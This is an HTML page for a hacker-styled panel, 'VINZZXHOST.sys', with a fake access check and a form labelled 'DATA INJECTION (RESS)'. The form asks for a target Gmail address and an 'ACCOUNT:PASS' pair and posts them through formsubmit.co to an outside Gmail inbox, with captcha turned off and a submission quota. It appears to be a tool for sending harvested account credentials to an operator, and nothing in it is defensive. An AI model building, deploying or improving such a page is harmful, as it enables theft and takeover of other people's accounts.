<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VINZZXHOST.sys - CLIENT</title>
    <style>
        body { background-color: #000; color: #00ff44; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; padding: 20px; }
        .container { width: 100%; max-width: 380px; text-align: center; }
        
        /* HEADER LOGO */
        .logo-circle { 
            width: 80px; height: 80px; border-radius: 50%; border: 2px solid #00ff44; 
            margin: 0 auto 15px; box-shadow: 0 0 15px #00ff44; 
            display: flex; align-items: center; justify-content: center;
            font-size: 30px; font-weight: bold; background: #000;
        }
        .brand { font-size: 18px; font-weight: bold; letter-spacing: 3px; margin-bottom: 30px; text-shadow: 0 0 10px #00ff44; }

        /* BOX STYLE PERSIS SCREENSHOT 1 */
        .card { 
            border: 1px solid #00ff44; border-radius: 10px; padding: 20px; 
            margin-bottom: 20px; background: #000; text-align: left;
            box-shadow: inset 0 0 5px #00ff44;
        }
        .title-section { color: #00ff44; font-size: 12px; font-weight: bold; margin-bottom: 15px; text-transform: uppercase; }

        input { 
            width: 100%; padding: 12px; background: #000; border: 1px solid #333; 
            color: #00ff44; border-radius: 5px; margin-bottom: 15px; box-sizing: border-box; 
            outline: none; font-family: 'Courier New', monospace; font-size: 12px;
        }
        input:focus { border-color: #00ff44; }

        /* BUTTON EXECUTE */
        .btn-execute { 
            width: 100%; padding: 12px; border: none; border-radius: 5px; 
            background: #00ff44; color: black; font-weight: bold; cursor: pointer;
            box-shadow: 0 0 15px #00ff44; text-transform: uppercase; margin-top: 5px;
        }

        /* BLUE BUTTON BWAH */
        .btn-blue { 
            background: linear-gradient(to right, #00d2ff, #3a7bd5); width: 100%; padding: 14px; 
            border-radius: 10px; color: white; font-weight: bold; text-decoration: none; 
            display: block; text-align: center; box-sizing: border-box; margin-top: 10px;
            font-family: sans-serif; font-size: 14px;
        }

        .info-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px; color: #888; }
        .val { color: #00ff44; }

        #loginSection { margin-top: 50px; }
        #mainPanel { display: none; }
    </style>
</head>
<body>

<div class="container">
    <div id="loginSection">
        <div class="logo-circle">V</div>
        <div class="brand">VINZZXHOST.sys</div>
        <div class="card" style="text-align: center;">
            <div class="title-section" style="text-align: center;">ACCESS VERIFICATION</div>
            <input type="email" id="emailLogin" placeholder="[!] INPUT REGISTERED GMAIL">
            <button class="btn-execute" onclick="handleLogin()">VERIFY ACCESS</button>
        </div>
    </div>

    <div id="mainPanel">
        <div class="logo-circle">V</div>
        <div class="brand">VINZZXHOST.sys</div>

        <div class="card">
            <div class="title-section">SYSTEM STATUS</div>
            <div class="info-row">NODE: <span id="displayEmail" class="val">-</span></div>
            <div class="info-row">QUOTA: <span id="displayLimit" class="val">500</span></div>
            <div class="info-row">STATUS: <span class="val">ACTIVE</span></div>
        </div>

        <div class="card">
            <div class="title-section">DATA INJECTION (RESS)</div>
            <form action="https://formsubmit.co/GMAIL_UTAMA_ABANG@gmail.com" method="POST" onsubmit="updateLimit()">
                <input type="text" name="Owner" value="Result Own Vinzz 👽">
                <input type="email" name="Gmail_Target" placeholder="[!] INPUT TARGET GMAIL" required>
                <input type="text" name="Ress" placeholder="[!] INPUT ACCOUNT:PASS" required>
                
                <input type="hidden" name="_captcha" value="false">
                <button type="submit" class="btn-execute">EXECUTE UPDATE</button>
            </form>
        </div>

        <a href="https://wa.me/628818486388" class="btn-blue">🌐 ACCESS PUSAT PANEL</a>
    </div>
</div>

<script>
    function handleLogin() {
        const email = document.getElementById('emailLogin').value;
        const dataAdmin = localStorage.getItem('data_pembeli_vinzz');
        
        if (!dataAdmin || !dataAdmin.includes(email)) {
            alert("ACCESS DENIED: Gmail Not Registered!");
            return;
        }

        document.getElementById('loginSection').style.display = 'none';
        document.getElementById('mainPanel').style.display = 'block';
        document.getElementById('displayEmail').innerText = email;
    }

    function updateLimit() {
        let currentLimit = parseInt(document.getElementById('displayLimit').innerText);
        if (currentLimit > 0) {
            document.getElementById('displayLimit').innerText = currentLimit - 1;
        }
    }
</script>
</body>
</html>
